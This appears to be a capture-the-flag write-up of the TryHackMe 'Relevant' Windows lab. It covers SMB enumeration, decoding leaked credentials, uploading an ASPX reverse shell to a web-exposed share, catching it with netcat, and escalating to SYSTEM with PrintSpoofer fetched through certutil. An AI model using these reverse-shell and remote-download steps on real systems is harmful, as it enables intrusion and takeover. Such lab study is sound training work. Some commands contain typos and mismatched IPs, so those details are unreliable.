# Relevant

>Vadim Polovnikov (October xx, 2020)

**_Scope of Work:_**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt - Root.txt

Additionally, the client has provided the following scope allowances:

Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
Only the IP address assigned to your machine is in scope
Find and report ALL vulnerabilities (yes, there is more than one path to root)

## Reconnaissance

---

**Basic Nmap scan results:**

```txt
...
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Full scan is [here](https://github.com/Digital-Sherlock/OSCP-Toolbox/blob/master/TryHackMe/Relevant/Nmap/basic_scan.nmap)

**Nmap vuln scan results:**

```txt
...
smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143                                                                                                                                                  
|     Risk factor: HIGH                                                                                                                                                        
|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                                                                               
|        servers (ms17-010).                                                                                                                                                   
|                                                                                                                                                                              
|     Disclosure date: 2017-03-14                                                                                                                                              
|     References:                                                                                                                                                              
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

>Vulnerability: [CVE-2017-0143 (EnernalBlue)]("https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" "eternalblue")

**_Nmap smb-enum scan results:_**

```txt
Host script results:
|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.236.43\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.236.43\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.236.43\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.236.43\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

```

kali#**_smbclient //10.10.236.43/nt4wrksv_**

NO PASSWORD

Downloading password.txt ...

```txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

1. Bob - !P@$$W0rD!123

2. Bill - Juw4nnaM4n420696969!$$$

**Executing PSExec with Python using discovered credentials:**

_kali#python3 psexec.py bill:'Juw4nnaM4n420696969!$$$'@10.10.195.120_

```txt
[-] Authenticated as Guest. Aborting
```

Bill's account seems to be rahter not working or invalid.

_kali#python3 psexec.py bill:'Juw4nnaM4n420696969!$$$'@10.10.195.120_

```txt
[*] Requesting shares on 10.10.150.11.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[*] Found writable share nt4wrksv
[*] Uploading file lLOoIWuZ.exe
[*] Opening SVCManager on 10.10.150.11.....
[-] Error opening SVCManager on 10.10.150.11.....
[-] Error performing the installation, cleaning up: Unable to open SVCManager
```

Bob is an active user.

**Trying RDP with found credentials:**

_kali# xfreerdp /u:bob /p:!P@$$W0rD!123 /v:10.10.195.120:3389_

```txt
[19:27:40:103] [1662:1663] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[19:27:40:103] [1662:1663] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[19:27:40:118] [1662:1663] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[19:27:40:118] [1662:1663] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[19:27:40:453] [1662:1663] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[19:27:40:485] [1662:1663] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[19:27:40:485] [1662:1663] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[19:27:41:203] [1662:1663] [WARN][com.freerdp.crypto] - Certificate verification failure 'unable to get local issuer certificate (20)' at stack position 0
[19:27:41:203] [1662:1663] [WARN][com.freerdp.crypto] - CN = Relevant
[19:27:41:203] [1662:1663] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[19:27:41:203] [1662:1663] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[19:27:41:203] [1662:1663] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[19:27:41:203] [1662:1663] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.150.11:3389) 
[19:27:41:203] [1662:1663] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[19:27:41:203] [1662:1663] [ERROR][com.freerdp.crypto] - Common Name (CN):
[19:27:41:203] [1662:1663] [ERROR][com.freerdp.crypto] -        Relevant
[19:27:41:204] [1662:1663] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.150.11:3389 (RDP-Server):
        Common Name: Relevant
        Subject:     CN = Relevant
        Issuer:      CN = Relevant
        Thumbprint:  a0:c0:00:e2:51:f0:dc:6d:d3:2d:a0:16:9b:53:cd:1e:56:68:c9:70:11:ad:ca:d7:a7:5c:20:c3:22:97:0d:f9
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
[19:27:47:251] [1662:1663] [INFO][com.winpr.sspi.NTLM] - VERSION ={
[19:27:47:251] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6
[19:27:47:251] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1
[19:27:47:251] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601
[19:27:47:251] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000
[19:27:47:251] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE28A8235"
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_56 (0),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_KEY_EXCH (1),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_128 (2),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_VERSION (6),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_TARGET_INFO (8),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_EXTENDED_SESSION_SECURITY (12),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_TARGET_TYPE_SERVER (14),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_ALWAYS_SIGN (16),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_NTLM (22),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_SEAL (26),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_SIGN (27),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_REQUEST_TARGET (29),
[19:27:47:455] [1662:1663] [INFO][com.winpr.sspi.NTLM] -        NTLMSSP_NEGOTIATE_UNICODE (31),

...

[19:27:48:876] [1662:1663] [INFO][com.winpr.sspi.NTLM] - 0000 54 00 45 00 52 00 4d 00 53 00 52 00 56 00 2f 00 T.E.R.M.S.R.V./.
[19:27:48:876] [1662:1663] [INFO][com.winpr.sspi.NTLM] - 0016 31 00 30 00 2e 00 31 00 30 00 2e 00 31 00 35 00 1.0...1.0...1.5.
[19:27:48:876] [1662:1663] [INFO][com.winpr.sspi.NTLM] - 0032 30 00 2e 00 31 00 31 00                         0...1.1.
[19:27:48:876] [1662:1663] [INFO][com.winpr.sspi.NTLM] - [length=40] 
[19:27:49:285] [1662:1663] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[19:27:49:285] [1662:1663] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[19:27:49:285] [1662:1663] [ERROR][com.freerdp.core] - freerdp_post_connect failed
```

**~~Failed~~**

## More Scanning

---

**_nmap -p- -T4 X.X.X.X -oN all_ports_scan.nmap_**

```txt
# Nmap 7.80 scan initiated Tue Nov 10 18:18:33 2020 as: nmap -p- -T4 -oN all_ports_scan.nmap 10.10.195.120
Nmap scan report for 10.10.195.120
Host is up (0.10s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown

# Nmap done at Tue Nov 10 18:22:41 2020 -- 1 IP address (1 host up) scanned in 248.55 seconds
```

Port 49663 is the HTTP port:

```txt
PORT      STATE SERVICE VERSION
49663/tcp open  http    Microsoft IIS httpd 10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

---

**Searching for hiddent directories**

_dirsearch.py -u http://ip-addr:49663 -r -x 400,500 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --simple-report=dirsearch_report.txt_

>There's a /nt4wrksv directory with the same name as the SMB share

_smbclient -U bob //ip-addr/nt4wrksv_

```txt
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> dir
  .                                   D        0  Wed Nov 11 14:40:31 2020
  ..                                  D        0  Wed Nov 11 14:40:31 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  test.txt                            A        5  Wed Nov 11 14:40:31 2020

                7735807 blocks of size 4096. 4950483 blocks available
smb: \> 
```

Turns our we have the upload privileges.

## Exploitation

---

ASPX RevShell by **borjmz** --> [link]('https://github.com/borjmz/aspx-reverse-shell' 'github')

```c#
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
	protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "127.0.0.1"; //CHANGE THIS
            int port = 1234; ////CHANGE THIS
                
        CallbackShell(host, port);
    }
...
```

SMB share contents:

```txt
smb: \> dir
  .                                   D        0  Wed Nov 11 15:19:34 2020
  ..                                  D        0  Wed Nov 11 15:19:34 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  shell.aspx                          A    15969  Wed Nov 11 15:14:02 2020

                7735807 blocks of size 4096. 5137604 blocks available
smb: \>
```

**Getting Accress to the Machine:**

1. http://ip-addr:49663/nt4wrksv/shell.aspx

2. nc -lvnp 6666

```txt
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::6666
Ncat: Listening on 0.0.0.0:6666
Ncat: Connection from 10.10.27.244.
Ncat: Connection from 10.10.27.244:49908.
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

>**Flag #1** --> cd C:\Users\Bob\Desktop\user.txt

## Privilege Escalation

---

**_whoami /priv_**

```txt
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

>**SeImpersonatePrivilege is enabled**

SeImpersonatePrivilege exploit explanation -  [PrintSpoofer]("https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/", "link")

### Exploit

C:\inetpub\wwwroot\nt4wrksv>certutil.exe -urclcache -f http://op-addr/PrintSpoofer.exe PrintSpoofer.exe

C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i c cmd

```txt
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

**Root.txt Flag:**

C:\Users\Administrator\Desktop\root.txt
